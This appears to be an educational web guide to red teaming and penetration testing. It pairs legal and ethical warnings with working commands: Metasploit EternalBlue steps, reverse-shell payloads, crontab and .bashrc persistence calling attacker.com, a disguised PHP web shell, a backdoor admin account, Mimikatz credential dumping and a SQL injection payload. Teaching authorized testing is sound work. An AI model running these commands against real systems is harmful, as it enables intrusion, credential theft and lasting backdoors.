What is the Red Team?

Foundation

The Red Team represents the offensive side of cybersecurity. Red teamers are ethical hackers who are paid and authorized to break into systems, networks, and buildings using the same techniques as real attackers — but with written permission and a clearly defined scope.

🎯 Core Purpose: "If we don't find our own weaknesses first, a real attacker will." Red teams simulate real-world adversaries to expose gaps in security before malicious actors exploit them.
Red Team vs Penetration Testing vs Vulnerability Assessment
Aspect🔴 Red Team🔵 Blue Team
RoleAttacker / OffenderDefender / Protector
GoalBreak in, expose weaknessesDetect, respond, prevent
MindsetThink like a hackerThink like a defender
ToolsNmap, Metasploit, Burp Suite, MimikatzSIEM, EDR, Firewall, IDS
Key SkillsExploitation, PrivEsc, OSINT, ScriptingLog analysis, IR, Forensics
Entry BarrierHigher — needs 2-3 yrs IT/security baseLower — good entry-level role
Top CertsOSCP, CEH, eJPT, PNPTSecurity+, CySA+, BTL1
📌 Purple Team: When red team and blue team collaborate — sharing attack techniques in real time so defenders can improve detection simultaneously — it's called a Purple Team exercise. It's the most efficient way to improve an organization's overall security posture.
02

Ethics, Legality & Rules of Engagement

⚠️ Critical

This is the most important section on this page. Penetration testing without explicit written authorization is a criminal offense in virtually every country. There is zero grey area — if you don't have permission, it's illegal. Period.

🚨 The Golden Rule: Never test systems you don't own or don't have explicit written permission to test. Using these skills on unauthorized systems is illegal under laws like the Computer Fraud and Abuse Act (CFAA) in the US, the Computer Misuse Act in the UK, and the IT Act in India. Violations carry prison sentences of 5–20 years.

Rules of Engagement (ROE)

Before any authorized penetration test begins, the red team and client sign a Rules of Engagement document that defines exactly what's allowed. Think of it as the "terms and conditions" of the hack.

1

Scope Definition

Which IP ranges, domains, applications, and systems are in-scope (can be tested) vs out-of-scope (strictly off-limits). Example: "Test 192.168.1.0/24 and app.corp.com — do NOT touch payroll.corp.com."

2

Testing Window

What hours and days testing is permitted. "Testing allowed Monday–Friday 9am–5pm only" prevents disruptions to live business operations.

3

Allowed Techniques

What attack types are permitted: social engineering, physical access, denial-of-service? Many clients exclude DoS attacks because they disrupt business.

4

Emergency Contacts

A 24/7 contact to call if something accidentally breaks or if a critical vulnerability is found that requires immediate action.

5

Data Handling

How to handle sensitive data discovered (credentials, PII, financial data). Most ROEs require immediate secure deletion after the engagement.

Practicing Legally — Safe Environments

  • TryHackMe — Guided rooms in isolated VPN environments. Best for beginners.
  • Hack The Box (HTB) — CTF-style vulnerable machines. Industry standard.
  • VulnHub — Free downloadable vulnerable VMs for offline practice.
  • Your own home lab — VirtualBox + Kali Linux + Metasploitable/DVWA. 100% safe.
  • Bug Bounty programs — HackerOne, Bugcrowd — companies pay you to find bugs legally.
✅ Safe Practice Stack: Download VirtualBox (free) → Create a Kali Linux VM (attacker) → Download Metasploitable 2 VM (intentionally vulnerable target) → Connect both to a host-only network → You now have a legal, isolated hacking lab. This is how every professional starts.

Phase 01
Pre-Engagement — Define Everything First
This phase happens before touching a single system. You meet the client, sign a Statement of Work (SOW) and Rules of Engagement (ROE), define what success looks like, identify out-of-scope systems, and set the testing window. A poorly scoped engagement is dangerous — you could accidentally test a third-party system.

Phase 02
Reconnaissance — Know Your Target
Passive recon: gather info without touching the target — Google Dorks, WHOIS, DNS records, LinkedIn profiling, Shodan, certificate transparency logs. Active recon: directly interact with target systems — DNS zone transfers, port scanning. The more intel gathered here, the more focused and effective the attack phase becomes.

Phase 03
Enumeration — Map the Attack Surface
Now you interact directly with systems to find open ports, running services, software versions, user accounts, network shares, and more. This phase answers: "What exactly is running here, and what version is it?" Version numbers map directly to known CVEs (vulnerabilities).

Phase 04
Exploitation — Get In
Using discovered vulnerabilities to gain unauthorized access. This could be exploiting an unpatched CVE with Metasploit, cracking weak credentials, exploiting a SQL injection, or sending a phishing email with a malicious payload. The goal is a foothold — even the lowest-privilege access is enough to start with.
MetasploitSQLmapHydraBurp SuiteMSFvenom
Phase 05
Post-Exploitation — Go Deeper
You're in — now escalate privileges, pivot to other machines, establish persistence, dump credentials, and map the internal network. The goal is to demonstrate the maximum realistic impact of the breach: "Could an attacker reach your domain controller? Your backup systems? Your customer database?"

Phase 06–07
Cleanup & Reporting — Leave No Trace, Leave Everything Documented
Remove every backdoor, shell, script, and tool you planted. Then write a comprehensive report with: Executive Summary (for management), Technical Findings (for IT teams), CVSS severity scores, proof-of-concept screenshots, and step-by-step remediation guidance. The report IS the deliverable.

Enumeration — Mapping the Attack Surface

Core Skill

Enumeration is the art of squeezing every possible detail out of a target's systems. After knowing what is running (recon), enumeration tells you exactly how it's configured — which is where vulnerabilities live.

💡 The Hacker's Mindset: "Version number = CVE lookup." If you find Apache 2.4.49 running on a web server, you immediately search Apache 2.4.49 CVE — and you'd find CVE-2021-41773, a critical path traversal vulnerability. This is exactly how real attacks start.

Nmap — The King of Port Scanners

Nmap is the first tool nearly every pentester runs. It discovers what ports are open and what services are listening.

# Basic scan — find open ports
nmap 192.168.1.1

# Aggressive scan — OS, version, scripts, traceroute
nmap -A -T4 192.168.1.1

# Scan all 65535 ports (full scan)
nmap -p- 192.168.1.1

# Service version detection + default scripts
nmap -sV -sC 192.168.1.1

# Scan entire subnet
nmap -sn 192.168.1.0/24

# Save output to file (for report)
nmap -A -oN scan_results.txt 192.168.1.1

Web Enumeration — Finding Hidden Pages

Websites have directories and files that aren't linked publicly but still exist. Brute-force tools find them using wordlists.

# Gobuster — Find hidden directories
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# ffuf — Faster fuzzer, finds files & directories
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Found: /admin, /backup, /config.php, /.git — all gold!

SMB Enumeration (Windows Networks)

SMB (Server Message Block) is used by Windows for file sharing. Misconfigurations here are a goldmine for attackers.

# Check for null sessions and shared drives
enum4linux -a 192.168.1.10

# List SMB shares manually
smbclient -L //192.168.1.10 -N

# Check for EternalBlue (MS17-010 — WannaCry vulnerability)
nmap --script smb-vuln-ms17-010 192.168.1.10

Vulnerability Analysis — Finding What to Exploit

Analysis

After enumeration, you have a list of services and versions. Now you determine which ones have known vulnerabilities. This is where CVEs (Common Vulnerabilities and Exposures) and CVSS scores become your dictionary.

💡 CVE Explained: A CVE is a unique identifier for a publicly known security vulnerability. Example: CVE-2021-44228 is "Log4Shell" — a critical flaw in the Java logging library used by millions of apps. Every known vulnerability gets a CVE ID and a CVSS severity score.

CVSS Severity Scoring

CVSS (Common Vulnerability Scoring System) rates every vulnerability from 0–10:

ScoreSeverityColorExample
9.0–10.0Critical🔴 REDLog4Shell, EternalBlue, Heartbleed
7.0–8.9High🟠 ORANGEApache Struts RCE, ProxyLogon
4.0–6.9Medium🟡 YELLOWXSS, SSRF, information disclosure
0.1–3.9Low🟢 GREENBanner disclosure, verbose errors

Where to Find Exploits

🔎 ExploitDB
The world's largest public exploit database. Search by CVE, software name, or type. Every result includes ready-to-use exploit code.
exploit-db.com
🔐 NVD
NIST National Vulnerability Database. Official source for CVE details, CVSS scores, and affected software versions.
nvd.nist.gov
⚡ Metasploit
Search built-in exploit modules with search command. Pre-packaged, ready-to-run exploits for thousands of CVEs.
msfconsole
🐙 GitHub
Search CVE-XXXX PoC — researchers often publish proof-of-concept exploits. Also use searchsploit locally.
github.com
# searchsploit — search ExploitDB offline
searchsploit apache 2.4.49

# Output shows matching exploits:
Apache HTTP Server 2.4.49 - Path Traversal & RCE | linux/remote/50383.sh

# Copy the exploit to current directory
searchsploit -m linux/remote/50383.sh

Exploitation — Getting a Foothold

⚠️ Core Technique

Exploitation is the phase where you actually leverage a vulnerability to gain access to the target. The goal is a shell — a command prompt running on the target machine. Even low-privilege access (like a web server's www-data user on Linux) is a starting point you can escalate from.

Metasploit Framework — The Exploit Engine

Metasploit is the most famous exploitation framework, used by pentesters worldwide. It packages exploits into easy-to-use modules.

# Start Metasploit console
msfconsole

# Search for EternalBlue exploit (MS17-010 — SMB vulnerability)
msf6 > search ms17-010

# Select the exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Set target IP
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50

# Set your listener IP
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10

# Run the exploit
msf6 exploit(ms17_010_eternalblue) > run

# Success! You get a Meterpreter shell on the target
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49172)
meterpreter > whoami
NT AUTHORITY\SYSTEM   # Highest privilege — game over!

Types of Shells

Shell TypeHow It WorksWhen Used
Bind ShellTarget opens a port and waits for attacker to connectWhen attacker can reach target directly
Reverse ShellTarget connects back to attacker's listenerWhen target is behind firewall (most common)
Web ShellPHP/ASPX file uploaded to web server for command executionAfter file upload vulnerability exploitation
MeterpreterAdvanced memory-resident shell with full post-exploit toolkitMetasploit engagements
 
# Generate a reverse shell payload with MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# Simple netcat listener to catch the shell
nc -lvnp 4444

# One-liner Python reverse shell (works on Linux)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.10",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.run(["/bin/sh"])'
⚠️ Always Clean Up: After an authorized pentest, remove every payload, listener, and backdoor you created. Leave the system exactly as you found it (except for your documented findings). Leaving tools behind is unprofessional and potentially dangerous.

Privilege Escalation — From User to Root/SYSTEM

Post-Exploit

You've gained a shell — but you're a low-privileged user. Privilege escalation (PrivEsc) is the process of moving from www-data or a standard user to root (Linux) or NT AUTHORITY\SYSTEM (Windows). This gives you complete control over the machine.

The Privilege Escalation Ladder

🐧 Linux Privilege Escalation

  • SUID binaries abuse (find / -perm -4000)
  • Sudo misconfigurations (sudo -l)
  • Writable cron jobs running as root
  • Kernel exploits (DirtyCow, Sudo Baron)
  • Weak file permissions on /etc/passwd
  • PATH environment variable injection
  • NFS misconfiguration (no_root_squash)
  • Writable service scripts / start-up files

🪟 Windows Privilege Escalation

  • AlwaysInstallElevated (MSI exploit)
  • Unquoted service paths
  • Weak service permissions (replace binary)
  • Token impersonation (PrintSpoofer, Potato)
  • UAC bypass techniques
  • DLL hijacking
  • Registry AutoRun abuse
  • Credential harvesting from memory (Mimikatz)

Automated PrivEsc Enumeration Scripts

# Linux — LinPEAS (most popular, runs automated checks)
curl -L https://linpeas.sh | bash

# Linux — LinEnum (alternative)
./LinEnum.sh -s -r report.txt

# Linux — find SUID binaries manually
find / -perm -4000 -type f 2>/dev/null

# Linux — check sudo permissions
sudo -l

# Windows — WinPEAS
.\winPEASany.exe

# Windows — check if AlwaysInstallElevated is set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
📌 GTFOBins: If you find a SUID binary or a sudo permission for a known Linux binary, check gtfobins.github.io — it's a curated list of how to exploit common Unix binaries to escalate privileges. For example, if vim has SUID set, GTFOBins tells you exactly how to get a root shell from it.

Post-Exploitation — Maximizing Impact

Advanced

Post-exploitation begins after you've gained elevated access. The goal shifts to: how deep can you go? This phase demonstrates the real business impact of the compromise.

Key Post-Exploitation Goals

1

Situational Awareness

Who am I? What machine is this? What OS? What users exist? What network am I on? Commands: whoami, hostname, ipconfig/ifconfig, net users, ps aux

2

Credential Harvesting

Dump password hashes, plaintext credentials from memory, browser saved passwords, config files with hardcoded credentials. Tools: Mimikatz (Windows), secretsdump.py (impacket), cat /etc/shadow (Linux)

3

Data Exfiltration Simulation

Identify sensitive data (PII, financial records, source code, intellectual property). Demonstrate you could have stolen it — document the location but don't actually exfiltrate real data in most engagements.

4

Pivoting / Lateral Movement

Use the compromised machine as a stepping stone to reach other internal systems. This proves how one compromised endpoint can lead to full network compromise.

5

Covering Tracks (Authorized)

Clear event logs, bash history, and temp files. In authorized engagements, document what you modified so it can be restored. Never delete logs on unauthorized systems — that's evidence destruction.

# Windows — Dump credentials with Mimikatz
mimikatz # sekurlsa::logonpasswords  # Dump LSASS memory
mimikatz # lsadump::sam              # Dump SAM database
mimikatz # kerberos::list            # List Kerberos tickets

# Meterpreter — dump hashes
meterpreter > hashdump

# Pass-the-Hash — authenticate without cracking the password
evil-winrm -i 192.168.1.100 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3cf7f8"

Lateral Movement — Spreading Through the Network

Network

Lateral movement is moving from one compromised machine to other machines in the network. Real attackers don't stop at one machine — they pivot until they reach the crown jewels (Domain Controller, database servers, backup systems).

Common Lateral Movement Techniques

TechniqueDescriptionTools
Pass-the-Hash (PtH)Use a stolen NTLM hash to authenticate as that user without knowing their passwordEvil-WinRM, CrackMapExec, Impacket
Pass-the-Ticket (PtT)Steal and reuse a Kerberos ticket for authenticationMimikatz, Rubeus
Golden TicketForge a Kerberos ticket with KRBTGT hash — gives permanent domain admin accessMimikatz, Impacket
Remote ServicesUse credentials to connect via RDP, WinRM, SSH, SMBEvil-WinRM, xfreerdp, smbexec
WMI ExecutionRun commands on remote Windows machines via Windows Management Instrumentationwmiexec.py, CrackMapExec

BloodHound — Mapping Active Directory Attack Paths

BloodHound is a game-changer for Windows Active Directory engagements. It maps all AD relationships (users, groups, computers, permissions) and automatically finds attack paths to Domain Admin.

# Collect AD data with SharpHound (runs on Windows target)
.\SharpHound.exe -c All

# Import collected JSON into BloodHound GUI
# BloodHound shows graphical attack paths:
[john.doe] → [Domain Admins] via GenericWrite on [IT-GROUP]
# Translation: john.doe can modify IT-GROUP, which gives DA access

# CrackMapExec — Swiss army knife for Windows network attacks
crackmapexec smb 192.168.1.0/24    # Scan SMB on entire subnet
crackmapexec smb 192.168.1.50 -u admin -p Password123 --shares  # Check shares
🎯 The Goal of Lateral Movement: Reach the Domain Controller (DC). If you compromise a DC, you effectively own the entire Windows domain — all user accounts, all computers, all data. In a pentest, reaching DC proves the organization's entire infrastructure could be compromised from a single entry point.

C2 Frameworks — Command & Control

Advanced

A Command and Control (C2) framework is the infrastructure a red teamer uses to maintain communication with and control over compromised machines. Real APT (Advanced Persistent Threat) actors use C2 to control entire botnets of compromised systems from a single interface.

C2 Architecture — How It Works

Popular C2 Frameworks

🎯 Cobalt Strike
Industry-leading commercial C2. Used by both red teams and real APT groups. Features: beacons, malleable C2, teamserver. Extremely stealthy with proper configuration.
Commercial · ~$5000/yr
👹 Havoc
Modern open-source C2 framework written in Go/C. Comparable to Cobalt Strike in features. Demon agent supports sleep obfuscation, HTTPS, and indirect syscalls.
Free · Open Source

Open-source C2 from BishopFox. Cross-platform agents (Windows/Linux/macOS). Supports mTLS, WireGuard, HTTP, DNS channels. Strong evasion capabilities.
Free · Open Source
🦅 Metasploit
The beginner-friendly choice. Meterpreter sessions function as basic C2. Built-in post-exploitation modules, persistence, and pivoting. Best for learning.
Free · Open Source

Persistence — Surviving Reboots

Technique

Persistence means ensuring your access survives a system reboot or user logoff. Real attackers plant persistence mechanisms so they can return even if their initial entry point is discovered and patched.

Linux Persistence Techniques

# Method 1 — Cron Job (runs every minute)
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/crontab

# Method 2 — SSH authorized_keys (permanent SSH access)
echo "ssh-rsa AAAA...your_public_key..." >> /home/user/.ssh/authorized_keys

# Method 3 — .bashrc / .profile (runs on every shell login)
echo "nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1 &" >> /home/user/.bashrc

# Method 4 — Systemd service (survives reboot)
cat > /etc/systemd/system/updater.service <<EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/reverse_shell.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater.service

Windows Persistence Techniques

# Method 1 — Registry Run Key (runs payload on every login)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\payload.exe"

# Method 2 — Scheduled Task (runs as SYSTEM on boot)
schtasks /create /sc onlogon /tn "WindowsUpdater" /tr "C:\Temp\payload.exe" /ru SYSTEM

# Method 3 — New local admin account (backdoor user)
net user hacker Password123! /add
net localgroup administrators hacker /add

# Method 4 — Golden Ticket (Kerberos — domain-wide persistence)
# Requires Domain Controller compromise + KRBTGT hash from Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

Web Shell — Remote Access via Browser

# Simple PHP web shell (upload to vulnerable web server)
<?php echo system($_GET['cmd']); ?>

# Usage: http://target.com/uploads/shell.php?cmd=whoami
# Returns: www-data

# More feature-rich — p0wny-shell, b374k, China Chopper
# Disguise it as an innocent file name:
mv shell.php wp-xmlrpc.php   # Looks like WordPress core file
⚠️ Remove All Persistence After Engagement: Every backdoor, every scheduled task, every added user account MUST be documented and removed before the engagement ends. Leaving persistence mechanisms creates real security risks for the client and is a breach of professional ethics.

Defense Evasion — Staying Under the Radar

Stealth

Advanced red teams don't just break in — they do it without being detected. Defense evasion techniques help bypass antivirus, EDR, IDS, and SIEM detection. Understanding evasion is also essential for blue teamers building better defenses.

Common Evasion Techniques

TechniqueHow It WorksDefeats
Payload Encoding/ObfuscationEncode payload in Base64, XOR, or custom encryption to hide from AV signaturesAntivirus (signature-based)
Living Off the Land (LOLBins)Use built-in OS tools (PowerShell, certutil, mshta) as attack tools — no malware to detectAV, some EDRs
Process InjectionInject shellcode into a legitimate process (svchost.exe, explorer.exe) — malicious code runs under trusted processProcess monitoring, AV
TimestompingChange file creation/modification timestamps to match system files — looks like old, trusted fileForensic timeline analysis
HTTPS C2 TrafficCommand and control traffic hidden inside normal HTTPS traffic — looks like regular web browsingNetwork-based IDS
DNS TunnelingEncode data in DNS queries — firewalls often allow all DNS trafficFirewall rules
Fileless MalwareExecute entirely in RAM — never writes to disk, so no file for AV to scanFile-based AV

Social Engineering — Hacking Humans

People

The most secure firewall in the world can't stop an employee clicking a convincing phishing email. Social engineering exploits human psychology, not technical vulnerabilities. Studies consistently show that over 90% of breaches start with phishing.

💡 Kevin Mitnick's Rule: The famous hacker Kevin Mitnick — once the FBI's most wanted — said: "I never had to hack a single computer. I simply asked people for what I wanted, and they gave it to me." Social engineering is often faster and more reliable than technical exploitation.

Social Engineering Attack Types

📧

Phishing

Mass emails impersonating trusted organizations (bank, Microsoft, HR). Goal: steal credentials or deliver malware. Spearphishing is targeted at specific individuals using personal details gathered from OSINT.

📞

Vishing (Voice Phishing)

Phone calls impersonating IT support, bank fraud teams, or executives. "Hi, this is Mike from IT — we detected unusual activity on your account. I need to verify your password to reset it."

💬

Smishing (SMS Phishing)

Malicious SMS messages: "Your parcel delivery failed. Click here to reschedule: [malicious link]" — extremely effective because people trust SMS more than email.

🎭

Pretexting

Creating a fabricated scenario to gain trust. Impersonating a vendor, auditor, or new employee to extract information or physical access: "I'm the new IT contractor — I need to check the server room."

🎁

Baiting

Leaving infected USB drives in parking lots, lobbies, or bathrooms. Curious employees plug them in — the drive auto-runs a payload. This technique has an astonishingly high success rate.

Psychology Behind Social Engineering

Social engineers exploit well-documented psychological principles:

PrincipleHow Attackers Use ItExample
AuthorityImpersonate CEO, IT admin, auditor"I'm calling from Microsoft Support — your PC is infected"
UrgencyCreate time pressure to bypass critical thinking"Your account will be locked in 15 minutes — click here NOW"
FearThreaten consequences if no action taken"IRS: Immediate action required — failure to comply results in arrest"
CuriosityEntice with interesting content"Your performance review results are attached"

Pentest Reporting — The Real Deliverable

Professional

A pentester who can't write a clear report is unemployable. The report is what the client paid for. It's proof of value, a roadmap for remediation, and a legal record of the engagement. A good report can be the difference between a client renewing the contract or not.

Anatomy of a Professional Pentest Report

CVSS Rating in Reports

Every finding must be rated using CVSS so teams can prioritize remediation. Critical findings get fixed first. Here's how to communicate severity clearly:

## Finding: SQL Injection in Login Form
Severity: CRITICAL (CVSS 9.8)
CVE Reference: N/A (custom application)
Affected: https://corp-target.com/login.php

Description:
The login form is vulnerable to SQL injection. An unauthenticated
attacker can bypass authentication and access all user accounts.

Evidence:
[Screenshot showing admin login bypass]
Payload used: admin' OR '1'='1'--

Business Impact:
An attacker can access all 50,000 user records, including credentials
and payment information, leading to data breach and regulatory fines.

Remediation:
1. Use parameterized queries / prepared statements
2. Implement input validation and sanitization
3. Deploy a Web Application Firewall (WAF)
4. Apply principle of least privilege to database user
